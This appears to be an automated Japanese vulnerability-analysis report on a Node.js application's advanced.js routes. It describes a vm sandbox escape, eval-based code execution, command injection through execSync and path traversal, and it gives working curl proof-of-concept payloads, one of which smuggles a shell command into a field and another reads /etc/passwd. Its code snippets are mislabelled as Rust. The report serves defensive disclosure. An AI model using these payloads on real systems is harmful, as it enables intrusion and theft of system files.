# 解析レポート

![中高信頼度](https://img.shields.io/badge/信頼度-中高-orange) **信頼度スコア: 80**

## 脆弱性タイプ

- `RCE`
- `LFI`

## 解析結果

本コードには以下の深刻な脆弱性が確認されました。

1. リモートコード実行 (RCE)
   - /vm/execute エンドポイントではユーザー提供のコードを vm.Script 内で eval 実行しており、constructor.constructor を使ったサンドボックス脱出が可能です。
   - /query/graph ルートでも動的に eval を利用しており、外部入力をそのまま実行します。
   - /file/advanced-ops の `execSync` 呼び出しにはユーザー入力が埋め込まれており、コマンドインジェクションが可能です。

2. ローカルファイルインクルード/パス操作 (LFI)
   - /file/advanced-ops のファイルコピー(write/copy)操作で source/destination の検証を行っておらず、パス・トラバーサルによる任意ファイル読み書きが可能です。

これらの脆弱性は実際に悪用可能であり、システム全体の乗っ取りや機密情報の漏洩を引き起こします。

## PoC（概念実証コード）

```text
1) /vm/execute でのサンドボックス脱出
curl -X POST http://localhost:3000/vm/execute -H 'Content-Type: application/json' -d '{"code":"constructor.constructor('"return process"')().exit()"}'

2) /file/advanced-ops exec コマンドインジェクション
curl -X POST http://localhost:3000/file/advanced-ops -H 'Content-Type: application/json' -d '{"operation":"exec","source":"/tmp/test.txt; ls / > /tmp/out.txt","destination":"ignored"}'

3) /file/advanced-ops パストラバーサルによる LFI
curl -X POST http://localhost:3000/file/advanced-ops -H 'Content-Type: application/json' -d '{"operation":"copy","source":"../../../../etc/passwd","destination":"/tmp/passwd"}'
```

## 関連コードコンテキスト

### 関数名: /vm/execute
- 理由: ユーザー提供コードを vm サンドボックス内で実行し、constructor.constructor による脱出が可能
- パス: repo/routes/advanced.js
```rust
script.runInNewContext(vmContext, { timeout });
```

### 関数名: /file/advanced-ops (exec)
- 理由: ユーザー制御の source をコマンド文字列に直接埋め込んでおり、コマンドインジェクションが可能
- パス: repo/routes/advanced.js
```rust
const output = execSync(`cat ${source} | head -10`, { encoding: 'utf8' });
```

### 関数名: /query/graph
- 理由: 動的フィールドを eval しており、任意の JavaScript 実行による RCE が可能
- パス: repo/routes/advanced.js
```rust
if (field.includes('()')) { return eval(field); }
```

## 解析ノート

- ファイル操作・コマンド実行系でユーザー入力をそのまま利用している箇所を探索
- execSync や fs.readFileSync/fs.writeFileSync に直 input を埋め込み、パス検証がないためパス・トラバーサルとコマンドインジェクションを発見
- vm/execute と query/graph は動的実行手法を使っており、eval / vm.Script によるサンドボックス脱出を特定
- 他にも race condition や timing attack があるが、最も致命的なのはコード実行・ファイル操作系の RCE / LFI 脆弱性と判断

